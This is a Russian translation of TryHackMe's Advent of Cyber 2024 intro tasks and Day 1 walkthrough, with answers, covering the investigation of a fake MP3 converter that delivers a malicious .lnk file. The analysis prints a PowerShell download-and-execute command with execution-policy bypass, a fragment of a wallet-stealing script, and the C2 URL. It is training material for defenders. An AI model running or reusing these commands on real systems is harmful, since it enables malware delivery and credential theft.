[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Advent of Cyber 2024](https://tryhackme.com/r/room/adventofcyber2024) 

Всего 32 задания:
## Задание 1
Добро пожаловать в Advent of Cyber 2024!
Сможете ли вы в этом году в Advent of Cyber помочь Макскиди и Глюку защитить SOC -mas от планов злого мэра Малваре?

Погрузитесь в удивительный мир кибербезопасности, выполняя праздничные упражнения для новичков каждый день в 
преддверии Рождества! 

Advent of Cyber доступен всем пользователям TryHackMe, и, что самое приятное, участие в нем бесплатное.  У вас также 
будет шанс выиграть в этом году огромный призовой розыгрыш в размере 100 000 долларов . Чем больше вопросов вы 
ответите, тем выше ваши шансы на КРУПНЫЙ выигрыш!

Представьте себе это как рождественский календарь, но с захватывающими (и праздничными) заданиями по безопасности 
вместо шоколада. 

#### Главные призы
В этом году нас ждет самый крупный и лучший розыгрыш призов:  общая сумма призов превышает 100 000 долларов !

В этом событии количество вопросов, на которые вы ответите, действительно имеет значение! За каждый вопрос, на 
который вы ответите правильно, вы получите лотерейный билет. Чем больше лотерейных билетов вы соберете, тем выше 
ваши шансы на крупный выигрыш!

Чтобы получить шанс выиграть главный приз — билеты на DEF CON с проживанием, вам нужно будет выполнить все задания 
в этой комнате до 31 декабря! Это также принесет вам сертификат о завершении.

Вот призы, которые можно выиграть:

- 15x монитор Samsung ($300.00)	7x Рюкзак GRID ($225.00)
- 20 наушников JBL ($130.00)	15 фирменных рюкзаков из хлопчатобумажной ткани ($65.00)
- 4x Наушники Sony ($450.00)	3x PAC-MAN™ Deluxe Аркадная игра ($500.00)
- 5 стульев для письменного стола ($249.00)	20 больших органайзеров Arlo Tech ($70,00)
- 20 комплектов Sidekick Tech Kit ($50.00)	15 фирменных наушников Apple AirPods Pro (2-го поколения) ($300,00)
- 10x Apple TV 4K 64 ГБ (3-го поколения) ($149.00)	10 персонализированных классических вещей Catch:3, итальянская 
  кожа ($190,00)
- 15x Clutch® Pro USB-C для Android и iPhone 15+ ($50.00)	Подписка на 500 THM (1 месяц) ($14.00)
- 5 эспрессо-машин с помпой Stilosa на 15 бар (150 долларов США)	Подписка на 300 THM (3 месяца) ($42.00)
- 5 игровых досок Infinity Game Board™ ($500.00)	Подписка на 25 тайских манатов (6 месяцев) ($84,00)
- 20 фирменных зарядных устройств MagSafe ($45.00)	Подписка на 5 THM (12 месяцев) ($126.00)
- 5x Duo Standing Desk ($499.00)	400 подарочных карт TryHackMe Swag (10,00 $)
- 10x Nintendo Switch 32 ГБ Lite ($250.00)	300 подарочных карт TryHackMe Swag ($20,00)
- Модель Switch OLED с тремя OLED-дисплеями и неоново-красным и неоново-синим Joy-Con ($420,00)	150 подарочных карт 
  TryHackMe Swag (50 долл. США) (50,00 долл. США)
- 10 солнечных зарядных устройств и аварийная радиостанция ($50.00)	80x подарочных карт TryHackMe Swag ($75) ($75.00)
- 2x PlayStation VR2 ($600.00)	20 подарочных карт TryHackMe Swag (100 долл. США) (100,00 долл. США)
- 5x наружных Bluetooth-динамиков Beosound Explore ($249,00)	200 карточек Hacktivity ($20.00)
- 10 очков Therabody SmartGoggles ($199.00)	5x DEF CON ($460.00)
- 10x Ornata V3 полноразмерная проводная игровая клавиатура с меха-мембраной и подсветкой Chroma RGB ($79.00)	
  ГЛАВНЫЙ ПРИЗ: 3x DEF CON + проживание (1500,00 долл. США)

Все победители будут выбраны случайным образом, проверены нашей командой (мошенничество не допускается!) и объявлены 
в понедельник, 6 января 2025 года. 

#### Общие правила
Нарушение любого из следующих правил приведет к исключению из мероприятия:

- .tryhackme.com и сервер OpenVPN недоступны для зондирования, сканирования или эксплуатации
- Пользователям разрешено взламывать только те машины, которые размещены в комнатах, к которым у них есть доступ.
- Пользователи не должны нападать на других пользователей или преследовать их.
- Пользователи должны войти на мероприятие только один раз, используя одну учетную запись.
- Ответы на вопросы не подлежат разглашению, если они не показаны на видео/трансляциях.
Обман
- Использование аккаунтов ботов
- Условия розыгрыша призов можно найти на этой  странице .

Обратите внимание: мошенничество НЕ допускается и приведет к дисквалификации с мероприятия Advent of Cyber. Все 
победители будут полностью проверены. Это включает в себя, в частности: 

- создание подставных аккаунтов для увеличения шансов на победу
- использование ботов для автоматического заполнения ответов в комнате
#### Как пройти квалификацию
Чтобы получить главные призы, вы должны ответить на вопросы в заданиях Advent of Cyber 2024, начиная с Дня 1 
(Задание 7 этой комнаты). Только ответы на вопросы в комнате Advent of Cyber 2024 позволят вам принять участие в 
розыгрыше.  

Неважно, когда вы выполните задания. Вам просто нужно выполнить их до 31 декабря 2024 года. Например, если вы 
выполните вопросы из Дня 1 31 декабря 2024 года, вы все равно получите такое же количество лотерейных билетов, как и 
пользователь, который выполнит задания в день их публикации!
Вам не обязательно отвечать на все вопросы или по порядку. Чем больше вопросов вы ответите, тем больше лотерейных 
билетов вы получите и тем выше ваши шансы на победу.
Пожалуйста, посетите эту  страницу,  чтобы ознакомиться с подробными Условиями и положениями лотереи.
ВАЖНОЕ ПРИМЕЧАНИЕ: Лотерейные билеты не будут видны в вашем профиле. Количество лотерейных билетов всегда равно 
количеству вопросов, на которые вы ответили в этой комнате.

Сертификат и значок
Наконец, если вы выполните все задания в мероприятии, вы получите сертификат о завершении и значок! Поскольку ваше 
имя будет включено в сертификат, мы советуем убедиться, что ваше полное имя указано (и обновлено) в  вашем профиле.


Избранные видео
Каждая выпущенная задача сопровождается видеоруководством, которое поможет вам пройти ее. Вы можете ожидать увидеть 
некоторых из ваших любимых создателей видео по кибербезопасности. Видео последнего дня будет отображаться в верхней 
части комнаты, но все видео будут доступны в соответствующем контенте задачи.

В этом году на Advent of Cyber будут представлены такие создатели, как 0day, UnixGuy, Джеральд Оже, Тайлер Рамсби, 
Bearded IT Dad, Day Cyberwox, Маркус Хатчинс, Дэвид Алвес, InsiderPHD, Tib3rius,  Джош Мейсон , Cyb3rMaddy и другие!

### Ответьте на вопросы ниже
Я прочитал(а) правила и условия розыгрыша. 
```commandline
Ответ не нужен
```

## Задание 2
Присоединяйтесь к нашему сообществу
Подпишитесь на нас в социальных сетях, чтобы получать эксклюзивные призы, узнавать о заданиях Advent of Cyber и 
анонсировать розыгрыш призов!

Подпишитесь на нас в LinkedIn !
Станьте частью нашего сообщества и присоединяйтесь к нашему  Discord !
Подпишитесь на нас в X,  чтобы получать ежедневные публикации с заданиями!
Присоединяйтесь к нам в Instagram ! 
Подпишитесь на нас в Facebook !
Присоединяйтесь к нашему растущему сабреддиту !
Подписывайтесь на наши TikTok !

Присоединяйтесь к нашему Discord
Discord — это сердце сообщества TryHackMe. Это место, где мы общаемся с другими хакерами, получаем помощь в сложных 
комнатах и узнаем, когда открывается новая комната. На нашем сервере Discord более 220 000 участников (и их число 
продолжает расти с каждым днем), поэтому здесь всегда что-то происходит.

Вы в восторге от Advent of Cyber? Посетите специальный канал на нашем Discord, где вы сможете пообщаться с другими 
участниками мероприятия и следить за ежедневными релизами!

Если вы им раньше не пользовались, настроить его очень просто (рекомендуем установить приложение). Мы зададим 
несколько вопросов для начала работы, чтобы помочь вам понять, какие каналы наиболее актуальны для вас.

Что вы получаете с Discord?
Присоединение дает множество преимуществ:

- Обсудите текущие проблемы «Наступления киберпространства» и получите поддержку на специальном канале.
- Узнайте, как улучшить свои заявления о приеме на работу и ускорить свой путь к киберкарьере.
- Узнайте о предстоящих мероприятиях и испытаниях TryHackMe.
- Просмотрите форумы для обсуждения всех наших учебных программ и выпусков.
Нажмите на эту ссылку, чтобы присоединиться к нашему серверу Discord:  Присоединяйтесь к сообществу!

Хватайте свою добычу!
Хотите представить сувениры с вашей любимой платформы обучения кибербезопасности? У нас есть НОВЫЙ специальный 
выпуск Advent of Cyber swag, который теперь доступен для заказа!



### Ответьте на вопросы ниже
Присоединяйтесь к нашему Discord и поздоровайтесь!

```commandline
Ответ не нужен
```
Есть ли специальный канал Advent of Cyber на TryHackMe Discord, где пользователи могут обсуждать ежедневные задачи и 
получать специальную поддержку? (да/нет) 

```commandline
yes
```
Подпишитесь на нас в  LinkedIn !

```commandline
Ответ не нужен
```
Подпишитесь на нас в  X !

```commandline
Ответ не нужен
```
Загляните на  сабреддит !

```commandline
Ответ не нужен
```
Присоединяйтесь к нам в  Instagram ! 

```commandline
Ответ не нужен
```
Подпишитесь на нас в  Facebook !

```commandline
Ответ не нужен
```
Подписывайтесь на наши  TikTok !

```commandline
Ответ не нужен
```
```commandline
Ответ не нужен
```

## Задание 3
Завершение Advent of Cyber как организации
С TryHackMe для бизнеса вы:

- Получите полный неограниченный доступ ко всему контенту и функциям TryHackMe (за исключением облачного контента и 
SOC Sim)
- Используйте конкурентное обучение и коллективно вовлекайте свою команду в выполнение задач Advent of Cyber, 
  оценивая их прогресс
- Создавайте индивидуальные учебные планы, чтобы углубить знания по темам Advent of Cyber и не только
- Обучение для команд по защите, наступлению и безопасности облачных вычислений
- Расширенные административные отчеты и панели мониторинга
- Поддержка внедрения для вашей организации, интеграция SSO и менеджер по работе с клиентами
- Создавайте собственные  события «Захват флага»  по запросу!
Если вы заинтересованы в изучении бизнес-преимуществ TryHackMe с помощью БЕСПЛАТНОЙ пробной версии, пожалуйста, 
  свяжитесь  с sales@tryhackme.com . Для получения дополнительной информации о нашем предложении посетите  
  бизнес-страницу.

Если вы являетесь нашим постоянным клиентом и хотите привлечь к участию более широкую команду и компанию, обратитесь 
к своему персональному менеджеру по работе с клиентами!

### Ответьте на вопросы ниже
Соберите свою команду для совместной работы над Advent of Cyber! 
```commandline
Ответ не нужен
```

## Задание 4
Короткий урок TryHackMe
Новые задания публикуются ежедневно в 16:00 по Гринвичу, а первое задание будет опубликовано 1 декабря. Они будут 
различаться по сложности (хотя они всегда будут нацелены на новичков). Каждое задание в событии будет включать 
инструкции по взаимодействию с практическим материалом. Пожалуйста, внимательно следуйте им! Инструкции будут 
включать карту подключения, похожую на ту, что показана ниже:

Изображение примера карты подключения, показывающее доступные варианты подключения

Давайте рассмотрим различные варианты.

Если доступна опция AttackBox:

AttackBox от TryHackMe — это  виртуальная машина Ubuntu, размещенная в облаке. Представьте себе AttackBox как 
виртуальный компьютер, который вы используете для проведения мероприятий по обеспечению безопасности. Во время 
мероприятия будет несколько задач, которые потребуют от вас развертывания AttackBox.

Вы можете развернуть AttackBox, нажав кнопку «Запустить AttackBox» в верхней части этой страницы.

Используя веб-ориентированный AttackBox, вы можете выполнять упражнения через браузер. Если вы постоянный 
пользователь, вы можете развернуть AttackBox  бесплатно на 1 час в день.  Если вы  подписаны , вы можете развернуть 
его на неограниченное количество времени!

Обратите внимание, что вы можете использовать свою собственную атакующую машину вместо AttackBox. В этом случае вам 
нужно будет подключиться с помощью OpenVPN. Инструкции по настройке OpenVPN  здесь.

Вы можете открыть AttackBox в полноэкранном режиме на новой вкладке с помощью этой кнопки:

Кнопка полноэкранного режима расположена в левом нижнем углу окна разделенного экрана.

Если доступна опция VM :

Большинство задач в Advent of Cyber будут иметь прикрепленную к ним виртуальную машину. Вы будете использовать 
некоторые из них в качестве целей для тренировки навыков наступательной безопасности, а некоторые — в качестве 
хостов для анализа и расследований. Если эта опция доступна, вам нужно нажать кнопку «Запустить машину».

После развертывания машины вы увидите, как в верхней части комнаты появится рамка. Она будет отображать некоторую 
важную информацию, например IP-адрес целевой машины, а также опции для продления таймера машины или его завершения.



Если доступна опция разделения экрана:

Некоторые задачи позволят вам просматривать развернутую виртуальную машину в режиме разделенного экрана. Обычно, 
если эта опция включена, разделенный экран открывается автоматически. Если этого не происходит, вы можете нажать эту 
кнопку в верхней части страницы, чтобы открыть разделенный экран.



Обратите внимание, что вы можете открыть виртуальные машины с разделенным экраном на другой вкладке с помощью этой 
кнопки: 

Кнопка полноэкранного режима расположена в левом нижнем углу окна разделенного экрана.

Если есть прямая ссылка:

Некоторые виртуальные машины позволяют просматривать необходимый контент прямо в другой вкладке браузера. В этом 
случае вы сможете увидеть ссылку на виртуальную машину прямо в содержимом задачи.



Обратите внимание: для работы ссылки сначала необходимо развернуть виртуальную машину, прикрепленную к задаче.

Если доступна возможность прямого подключения:

Некоторые задачи позволят вам подключиться к виртуальным машинам, подключенным с помощью RDP, SSH или VNC. Это 
всегда необязательно, и виртуальные машины с этой возможностью также будут доступны через разделенный экран. В этих 
случаях будут предоставлены учетные данные для входа, как на изображении ниже:

В случае предоставления учетных данных они будут отображены в виде открытого текста и встроены в содержимое комнаты.

Мы предоставляем это, поскольку некоторые пользователи могут предпочесть подключение напрямую. Однако, обратите 
внимание, что некоторые задачи намеренно отключат эту опцию. Если учетные данные не указаны, прямое подключение 
невозможно.

### Ответьте на вопросы ниже
Понятно! 
```commandline
Ответ не нужен
```

## Задание 5
Как Глюк украл SOC -mas


Снег падает на технологический город Уэрвилл, и все разные семьи Уэр собираются на городской площади, готовясь к 
городскому собранию. Мы видим, как Софтверы и Свободные ПО катаются по неоновым морозным полосам. Мы поворачиваем на 
Серверную улицу и видим, как Аппаратные и Прошивочные ПО маршируют в центр города, праздничные серверные огни мигают 
и мерцают в их глазах. Пора начинать готовиться к SOC -mas , самому радостному времени года в технологическом городе 
Уэрвилл.

Если мы поднимем глаза, то увидим за шумным городом заснеженную гору выброшенной техники. Валуны старых принтеров, 
потрескавшиеся скалы мониторов и хребты серверных стоек, скрепленные лозами кабелей Ethernet, и одинокое старое 
игровое кресло на вершине — это гора Хакит, и ни один Уорс не осмеливается туда подняться. Они боятся ее не из-за 
частых лавин дискет, Уорс избегает горы Хакит из-за Глюка.

Логово Глитча спрятано в глубокой пещере, и он сейчас там. Он хватает несколько кабелей, свисающих с потолка, и 
подключает их. Хотя они не такие новые и блестящие, как у Уорвилля, его серверы работают просто отлично! Глитч 
следит за безопасностью Уорвилля уже много лет, и этот SOC -mas не будет исключением. Уорсы могут бояться Глитча, 
думая, что он злой хакер, но это неважно. Щелкнув пальцами, он начинает печатать, устанавливая соединение с 
городской сетью. Время для взлома!

На городской площади Марта Мэй Уэр, организатор SOC -mas, поднимается на сцену, чтобы обратиться к городу, когда все 
огни внезапно мерцают. Все Уэры оглядываются, сбитые с толку, но это быстро проходит, и все возвращается на круги 
своя.

В здании муниципалитета мэр Малваре бьёт кулаками по столу. «Опять заблокировано!» — сердито кричит он. «Этот 
невыносимый Глюк снова взялся за дело!» План мэра остановить подготовку SOC-mas путём саботажа сегодняшнего 
заседания не удался. Ему придётся придумать что-то получше на завтра…

Тем временем в SOC Уорвилла царит хаос. Аналитики пытаются выяснить, что вызвало внезапный скачок напряжения, 
который поставил под угрозу всю технику в городе. McSkidy Software, ведущий эксперт по кибербезопасности города, 
указывает на файл журнала на экране и восклицает: «Теперь я не знаю точно, что произошло, но это доказывает, что у 
нас было соединение с горы Хакит!» McSkidy выбегает из SOC и направляется на гору. Когда она достигает пещеры, она 
не ожидает увидеть Глюка, ожидающего ее, с двумя чашками горячего какао в руках и с собакой, свернувшейся у его ног.

Это занимает большую часть вечера, но Глюк объясняет, чем он занимается: защищает город от злых планов мэра Малвара. 
Похоже, мэр хочет полностью остановить SOC -mas в этом году! Глюк знает, что Вэры могут не доверять ему или 
ненавидеть его, но он хочет помочь.

Теперь, объединенные общей целью, Макскиди и Глюк начинают свою работу в пещере горы Хакит, потому что они 
единственные, кто стоит между Уорвиллем и хаосом.

Возвращайтесь 1 декабря, чтобы помочь МакСкиди и Глюку защитить SOC -mas от планов злого мэра Малваре!

### Ответьте на вопросы ниже
Звучит серьезно! Я буду здесь, чтобы помочь Глюку 1 декабря!


```commandline
Ответ не нужен
```
## Задание 6
Оформите подписку со скидкой!
Событие Advent of Cyber полностью бесплатное! Однако мы рекомендуем ознакомиться с некоторыми причинами, по которым 
стоит подписаться:

Чтобы отпраздновать Advent of Cyber, вы можете получить скидку 30% на персональные годовые подписки, используя код 
скидки  AOC2024 при оформлении заказа. Эта скидка действительна до 31 декабря 2024 года, 23:59 GMT – это в: 


### Ответьте на вопросы ниже
Поделитесь скидкой с друзьями! 
```commandline
Ответ не нужен
```

## Задание 7
История

Баннер задач на день ДЕНЬ 1

Макскиди стучал по клавишам с уверенной ухмылкой,
Подозрительный веб-сайт. С чего начать?
Она видела такие сайты, полные кода и грязи,
Сомнительные домены и легкодоступные ориентиры.
Нажмите здесь, чтобы посмотреть видео-обучение!


Пальцы Макскиди летали по клавиатуре, ее глаза сузились, когда она увидела подозрительный веб-сайт на экране. Она 
видела десятки подобных вредоносных кампаний. На этот раз след привел прямо к человеку под именем «Glitch».

«Слишком просто», — пробормотала она с ухмылкой.

«У меня еще есть время», — сказала она, наклоняясь ближе к экрану. «Может быть, есть еще».

Она и не подозревала, что под поверхностью скрывается нечто гораздо более сложное, чем простое хакерское имя. Это 
было лишь начало запутанной паутины, распутывающей все, что она думала, что знает.

Иллюстрация, изображающая Макскиди перед домом.

#### Цели обучения
- Узнайте, как исследовать вредоносные файлы ссылок.
- Узнайте об OPSEC и ошибках OPSEC .
- Узнайте, как отслеживать и атрибутировать цифровые идентификационные данные при киберрасследованиях.

Подключение к машине
Прежде чем двигаться дальше, просмотрите вопросы в карточке подключения, показанной ниже, и запустите виртуальную 
машину, нажав кнопку Start Machine . Виртуальная машина должна быть полностью загружена через 3 минуты. Кроме того, 
вам понадобится AttackBox, который можно запустить, нажав кнопку Start AttackBox в верхней части страницы.


Запустить машину
ПРИМЕЧАНИЕ: 

Если вы нажимаете «Запустить машину» и сталкиваетесь с проблемой при ее запуске, не волнуйтесь — это просто высокий 
спрос. Что можно сделать?

Продолжайте пытаться! Машины становятся доступными, поскольку спрос колеблется.
Если у вас все еще возникают проблемы, вернитесь немного позже, когда людей будет меньше.
Баннер, демонстрирующий варианты подключения, представленные в этой комнате.

Исследование веб-сайта
Веб-сайт, который мы расследуем, — это конвертер Youtube в MP3, который в настоящее время распространяется среди 
организаторов SOC-mas. Вы решили копнуть глубже, услышав некоторые тревожные сообщения об этом веб-сайте.

Скриншот сайта.

С помощью AttackBox зайдите на веб-сайт, перейдя по адресу MACHINE_IP с помощью веб-браузера.

На первый взгляд сайт выглядит законным и презентабельным. На странице «О нас» даже написано, что он создан «The 
Glitch». Как любезно с их стороны облегчить нам работу!

Прокрутив вниз, вы увидите список функций, который обещает быть «Безопасным» и «Надежным». По нашему опыту, это 
маловероятно.

Сайты конвертеров YouTube в MP3
Эти сайты существуют уже давно. Они предлагают удобный способ извлечения аудио из видео YouTube, что делает их 
популярными. Однако исторически эти сайты были замечены как имеющие значительные риски, такие как:

- Вредоносная реклама : многие сайты содержат вредоносную рекламу, которая может использовать уязвимости в системе 
пользователя, что может привести к заражению.
- Фишинговые атаки : пользователи могут быть обмануты и получить личную или конфиденциальную информацию с помощью 
  поддельных опросов или предложений.
- Встроенное вредоносное ПО : некоторые конвертеры могут поставляться с вредоносным ПО, заставляя пользователей 
  неосознанно запускать его.
- Какую гнусность приготовил для нас этот сайт?

Получаем некоторые мелодии
Давайте выясним это, вставив любую ссылку YouTube в форму поиска и нажав кнопку «Конвертировать». Затем выберите 
любой mp3 or mp4из вариантов. Это должно загрузить файл, который мы могли бы использовать для исследования. Например,
мы можем использовать https://www.youtube.com/watch?v=dQw4w9WgXcQ , классику, если вы меня спросите.

После загрузки перейдите в папку Downloads или, если вы используете AttackBox, в каталог /root/. Найдите файл с 
именем download.zip, щелкните его правой кнопкой мыши и выберите Extract To . В диалоговом окне нажмите кнопку 
Extract , чтобы завершить извлечение.

Скриншот, демонстрирующий распаковку zip-архива.

Теперь вы увидите два извлеченных файла: song.mp3и somg.mp3.

Чтобы быстро определить содержимое файла, дважды щелкните значок «Терминал» на рабочем столе, затем выполните 
fileкоманду для каждого из них. Сначала попробуем проверить song.mp3. 

Проверить файл 1 терминал
```commandline
user@tryhackme:~$ file song.mp3
download.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
```

Вроде бы ничего подозрительного, судя по выходу. Как и ожидалось, это просто файл MP3.

А как насчет второго файла somg.mp3? По одному имени файла можно сказать, что что-то не так. Но давайте все равно 
проверим, запустив file команду на нем. 

Проверить файл 2 терминала
```commandline
user@tryhackme:~$ file somg.mp3
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
```
А вот это уже интереснее!

Вывод сообщает нам, что вместо MP3 файл является "ярлыком MS Windows", также известным как  .lnk файл. Этот тип файла 
используется в Windows для ссылки на другой файл, папку или приложение. Эти ярлыки также могут использоваться для 
запуска команд! Если вы когда-либо видели ярлыки на рабочем столе Windows, вы уже знаете, что это такое.

Существует несколько способов проверки .lnk  файлов для выявления встроенных команд и атрибутов. Однако для этой 
комнаты мы будем использовать ExifTool , который уже установлен на этой машине.

Для этого вернитесь в Терминал и введите:

Использование терминала Exiftool
```commandline
user@tryhackme:~$ exiftool somg.mp3
```

Просмотрите вывод, чтобы найти команду, используемую в качестве ярлыка в somg.mp3 файле. Если вы прокрутите вывод 
вниз, вы должны увидеть команду PowerShell.

Использование терминала Exiftool
```commandline
...
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
user@tryhackme:~# 
```

Что делает эта команда PowerShell :

- Флаги -ep Bypass -nopотключают обычные ограничения PowerShell, позволяя выполнять скрипты без вмешательства 
настроек безопасности или профилей пользователей.
- Метод DownloadFileизвлекает файл (в данном случае IS.ps1) с удаленного сервера ( https://raw.githubusercontent.
  com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1 ) и сохраняет его в C:\\ProgramData\\каталоге на целевой машине.
- После загрузки скрипт выполняется с помощью PowerShell с помощью iex команды, которая запускает загруженный s.ps1 
  файл.
- Если вы откроете содержимое файла для загрузки с помощью браузера ( https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1), вы увидите, как нам повезло, что мы сейчас не используем Windows.

PowerShell
Скриптовый терминал 
```commandline
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

[Output truncated for brevity]
```

Скрипт предназначен для сбора конфиденциальной информации из системы жертвы, такой как криптовалютные кошельки и 
сохраненные учетные данные браузера, и отправки ее на удаленный сервер злоумышленника.

Отказ от ответственности:  Весь контент в этой комнате, включая код CPP, скрипты PowerShell и команды, 
предоставляется исключительно в образовательных целях. Пожалуйста, не запускайте их на хосте Windows.

Это выглядит довольно типично для сценария PowerShell такого назначения, за одним заметным исключением: сигнатура в коде, которая гласит.

Создано единственным и неповторимым ММ

Поиск источника
Есть много путей, по которым мы могли бы продолжить наше расследование. Мы могли бы исследовать веб-сайт дальше, 
проанализировать его исходный код или поискать открытые каталоги, которые могли бы раскрыть больше информации о 
настройках злоумышленника. Мы можем поискать хэш или сигнатуру в общедоступных базах данных вредоносных программ, 
таких как VirusTotal или Any.Run. Каждый из этих методов может дать полезные подсказки.

Однако для этой комнаты мы попробуем что-то немного другое. Поскольку у нас уже есть код PowerShell, его поиск в 
сети может дать нам полезные наводки. Это далекая попытка, но мы рассмотрим ее в этом упражнении. 

Есть много мест, где мы можем искать код. Наиболее широко используемым является Github. Давайте попробуем поискать там.

Для эффективного поиска мы можем искать уникальные части кода, которые мы могли бы использовать для поиска. Чем 
более отличительные, тем лучше. Для этого сценария у нас есть строка, которую мы обнаружили ранее, которая гласит:

«Создано единственным и неповторимым ММ»

Найдите это на Github.com или перейдя по этой ссылке:  https://github.com/search?q=%22Created+by+the+one+and+only+MM%22&type=issues

Страница результатов поиска GitHub на основе указанных ключевых слов.

Вы заметите кое-что интересное, если изучите страницы в результатах поиска.

Примечание!
Если вы получили сообщение об ошибке ниже, это связано с тем, что на Github действуют ограничения скорости, если вы 
не вошли в систему. Чтобы исправить это, вы можете просто войти в систему с помощью учетной записи GitHub или 
перейти сразу к следующему шагу, перейдя по ссылке: https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1   

Сообщение об ошибке GitHub, предлагающее пользователю войти в систему для доступа к ресурсу.

Если просмотреть результаты поиска, то можно будет сделать вывод о личности злоумышленника на основе информации на 
странице проекта и в разделе GitHub Issues. 

Комментарий MM на GitHub по поводу упомянутого проекта, раскрывающий его личность.

Ага! Похоже, этот пользователь совершил критическую ошибку.

#### Введение в OPSEC
Это классический случай провала OPSEC .

Операционная безопасность ( OPSEC ) — термин, изначально придуманный в армии для обозначения процесса защиты 
конфиденциальной информации и операций от противников. Цель состоит в том, чтобы выявить и устранить потенциальные 
уязвимости до того, как злоумышленник сможет узнать их личность.

В контексте кибербезопасности, когда злоумышленники не следуют надлежащим практикам OPSEC , они могут оставлять 
цифровые следы, которые можно собрать воедино, чтобы раскрыть их личность. Вот некоторые распространенные ошибки 
OPSEC :

- Повторное использование имен пользователей, адресов электронной почты или учетных записей на нескольких платформах. 
Можно было бы предположить, что любой, кто пытается скрыть свои следы, удалит такую очевидную и компрометирующую 
  информацию, но иногда это происходит из-за тщеславия или просто забывчивости.
- Использование идентифицируемых метаданных в коде, документах или изображениях, которые могут раскрывать личную 
  информацию, такую как имена устройств, координаты GPS или временные метки.
- Публичное размещение информации на форумах или GitHub (как в текущем сценарии) с подробностями, которые связывают 
  их с их настоящей личностью или раскрывают их местонахождение или привычки.
- Неиспользование VPN или прокси-сервера при осуществлении вредоносной деятельности позволяет правоохранительным 
  органам отслеживать реальный IP-адрес злоумышленника.
- Можно было бы подумать, что человек, совершивший что-то плохое, сделает OPSEC своим главным приоритетом, но они 
  всего лишь люди и тоже могут совершать ошибки.

Например, вот несколько реальных ошибок OPSEC , которые привели к действительно крупным провалам:

Удаление администратора AlphaBay
Один из самых громких провалов OPSEC произошел с Александром Казесом, администратором AlphaBay, одной из крупнейших 
торговых площадок даркнета:

- В первых приветственных письмах с сайта Казес использовал адрес электронной почты « pimp_alex_91@hotmail.com ».
- В этом электронном письме был указан год его рождения и другая идентифицирующая информация.
- Он обналичил деньги, используя биткойн-счет, привязанный к его настоящему имени.
- Казес повторно использовал имя пользователя «Alpha02» на нескольких платформах, связывая свою личность в даркнете с 
  сообщениями на форуме под своим настоящим именем.


Китайская военная хакерская группа (APT1)
Есть также печально известная китайская хакерская группа APT1, которая допустила несколько ошибок OPSEC :

- Один из участников, Ван Дун, подписал свой вредоносный код псевдонимом «Ugly Gorilla».
- Этот псевдоним был связан с сообщениями на форуме по программированию, связанными с его настоящим именем.
- Группа использовала предсказуемые соглашения об именах пользователей, кодов и паролей.
- Их деятельность постоянно совпадала с рабочим временем Пекина, что делало их местонахождение очевидным.
- Эти сбои предоставили исследователям в области кибербезопасности и правоохранительным органам достаточно информации 
  для публичной идентификации членов группы.

Раскрытие ММ
Если вы тщательно изучили результаты поиска GitHub, вы должны были обнаружить несколько улик, основанных на 
ненадлежащих методах обеспечения безопасности (OPSEC) со стороны злоумышленника.

Мы знаем, что злоумышленник оставил отличительную подпись в коде PowerShell (MM). Это позволило нам искать связанные 
репозитории и страницы проблем на GitHub. Затем мы обнаружили страницу проблем, где злоумышленник участвовал в 
обсуждениях, предоставляя больше контекста и связывая свою деятельность с другими проектами.

Иллюстрация особняка со ступенями, ведущими к нему.

В этом обсуждении они ответили на вопрос об изменении кода. Этот ответ, в сочетании с их уникальным ником, был еще 
одной критической ошибкой, оставившей за собой след доказательств, который можно отследить до них. Анализируя 
временные метки, имена пользователей и характер их взаимодействий, мы теперь можем приписать организатора атаки MM.

Что дальше?
МакСкиди копала глубже,  ее ум был острым и быстрым,
Но что-то было не так, какой-то странный трюк.
Собранные ею части просто не совпадали,
Головоломка с пробелами, запутанный дизайн.
По мере того, как Макскиди продолжала копать, возникла закономерность, которая не соответствовала образу, который 
она собирала по кусочкам. В неясных местах, глубоко зарытых в деталях, появился другой ник: «ММ».

«Кто такой ММ?» — пробормотал Макскиди, и таинственность стала еще глубже.

Хотя все признаки на сайте, казалось, указывали на Глитча как на автора, стало ясно, что кто-то приложил немало 
усилий, чтобы имя Глитча появилось везде. Однако разбросанные следы, оставленные ММ, свидетельствовали о 
преднамеренной попытке переложить вину.

### Ответьте на вопросы ниже
Похоже, файл song.mp3 не такой, как мы ожидали! Запустите "exiftool song.mp3" в терминале, чтобы узнать автора песни.
Кто автор?  
```commandline
Tyler Ramsbey
```
Вредоносный скрипт PowerShell отправляет украденную информацию на сервер C2. Каков URL этого сервера C2?
```commandline
http://papash3ll.thm/data
```
Кто такой ММ? Может быть, его страница профиля на Github даст подсказки?
